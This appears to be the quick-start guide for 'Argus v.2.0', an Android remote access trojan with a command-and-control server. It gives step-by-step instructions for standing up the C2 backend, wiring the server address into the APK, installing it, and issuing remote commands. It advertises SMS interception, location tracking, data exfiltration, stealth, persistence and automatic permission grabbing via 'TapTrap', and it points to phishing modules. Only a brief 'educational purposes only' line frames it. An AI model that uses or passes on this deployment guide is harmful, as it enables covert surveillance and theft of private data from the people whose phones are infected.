# 🚀 Quick Guide - Argus v.2.0

## ⚡ Quick Start in 5 Steps

### 1️⃣ Setup C2 Server

```bash
cd "Argus v.2.0/backend"

# Install dependencies
pip install -r requirements.txt

# Initialize database
python init_db.py

# Start server
python run_server.py
```

✅ **Server available at:** `http://localhost:5000`  
🔐 **Login:** `admin` / `admin123`

---

### 2️⃣ Configure Android APK

**a) Open in Android Studio:**
- Open `Argus v.2.0` folder in Android Studio
- Wait for Gradle synchronization

**b) Configure server IP:**

Edit: `android/src/main/java/com/argus/rat/MainActivity.java`

```java
// LINE 15-16: Change to your server IP
private static final String C2_SERVER_URL = "http://192.168.1.100:5000";
private static final String C2_WEBSOCKET_URL = "ws://192.168.1.100:5000";
```

**c) Build APK:**

```bash
cd android
./gradlew assembleRelease
```

📦 **APK generated at:** `android/build/outputs/apk/release/android-release.apk`

---

### 3️⃣ Install on Device

```bash
# Via ADB
adb install android/build/outputs/apk/release/android-release.apk

# Or manually copy APK to device
```

---

### 4️⃣ Execute and Configure

1. **Open app** on Android device
2. **Wait for TapTrap** to collect permissions automatically
3. **Check C2 server dashboard**
4. Device will appear in "Devices" list

---

### 5️⃣ Remote Control

**On C2 Dashboard:**

1. Access `http://YOUR-SERVER:5000`
2. Login with `admin` / `admin123`
3. Go to **"Devices"** - View connected devices
4. Go to **"Commands"** - Send remote commands
5. Go to **"Logs"** - View activities and exfiltrated data

---

## 🎯 Main Commands

### Via Web Dashboard:

| Action | Description |
|--------|-------------|
| **Devices** | List all devices |
| **Commands** | Send remote commands |
| **Logs** | View activity history |
| **Dashboard** | Real-time statistics |

### Command Types:

```json
// Send SMS
{
  "command_type": "send_sms",
  "data": {
    "phone": "+5511999999999",
    "message": "Test message"
  }
}

// Get location
{
  "command_type": "get_location",
  "data": {}
}

// List applications
{
  "command_type": "list_apps",
  "data": {}
}
```

---

## 🔧 Important Settings

### C2 Server (backend/config.py):

```python
# Server port
C2_SERVER_PORT = 5000

# Host (0.0.0.0 to accept from any IP)
C2_SERVER_HOST = '0.0.0.0'

# Public URL
C2_PUBLIC_URL = 'http://your-server.com:5000'

# Encryption key
ENCRYPTION_KEY = 'ArgusC2SecureKey2024!@#'
```

### Android Application (MainActivity.java):

```java
// C2 server URLs
private static final String C2_SERVER_URL = "http://192.168.1.100:5000";
private static final String C2_WEBSOCKET_URL = "ws://192.168.1.100:5000";
```

---

## 📱 Available Features

### ✅ Already Implemented:

- [x] SMS interception
- [x] Notification monitoring
- [x] GPS location tracking
- [x] Remote SMS sending
- [x] Data exfiltration
- [x] Stealth WebView
- [x] 24/7 persistence
- [x] TapTrap (automatic permissions)
- [x] Real-time C2 communication
- [x] Complete web dashboard

### 🔄 Automatic Features:

- Auto-start after boot
- Auto-restart if service dies
- Battery optimization bypass
- Automatic C2 reconnection
- Continuous data collection

---

## 🛠️ Quick Troubleshooting

### Problem: Device doesn't appear in dashboard

**Checklist:**
1. ✅ Is C2 server running?
2. ✅ Is IP/URL correct in MainActivity.java?
3. ✅ Does device have internet?
4. ✅ Does firewall allow port 5000?
5. ✅ Does app have necessary permissions?

**Useful logs:**
```bash
# View server logs
tail -f backend.log

# View Android logs (via ADB)
adb logcat | grep Argus-MainActivity
```

---

### Problem: Permissions not granted

**Solutions:**
1. Wait for TapTrap to complete the process
2. Grant permissions manually:
   - Settings → Apps → Argus → Permissions
   - Enable "Accessibility Service"
   - Disable "Battery optimization"

---

### Problem: WebSocket connection fails

**Checklist:**
1. ✅ Does server support WebSocket?
2. ✅ Does WebSocket URL use `ws://` (not `http://`)?
3. ✅ Is there no proxy blocking WebSocket?

---

## 📊 Monitoring

### Check System Status:

**On Android device:**
- Check if "System Service" notification is active
- Go to Settings → Running apps
- Should show "Argus" or app name

**On C2 server:**
- Dashboard → View "Online Devices"
- Devices → Check "Last Seen"
- Logs → View recent activities

---

## 🔒 Security

### Recommendations:

1. **Change default credentials** of dashboard
2. **Use HTTPS** in production
3. **Enable data encryption**
4. **Configure firewall** correctly
5. **Regular database backup**

### In Production:

```bash
# Use HTTPS
C2_PUBLIC_URL = 'https://your-server.com'

# Generate SSL certificate
sudo certbot --nginx -d your-server.com

# Change admin password
python -c "from werkzeug.security import generate_password_hash; print(generate_password_hash('NEW_PASSWORD'))"
```

---

## 🎓 Next Steps

After basic configuration, explore:

1. **Phishing System** - `backend/phishing/`
2. **Military Features** - `backend/military/`
3. **Dashboard Customization** - `backend/templates/`
4. **Log Analysis** - Dashboard "Logs" page

---

## 📞 Additional Resources

- **README.md** - Complete documentation
- **Source code** - All files commented
- **backend/README.md** - Server documentation
- **documentation/** - Technical guides

---

## ⚠️ Legal Reminder

This project is for **educational purposes only**.

Misuse may result in serious legal consequences.

---

**Version:** 2.0  
**Status:** ✅ Operational

**Good use! 🚀**


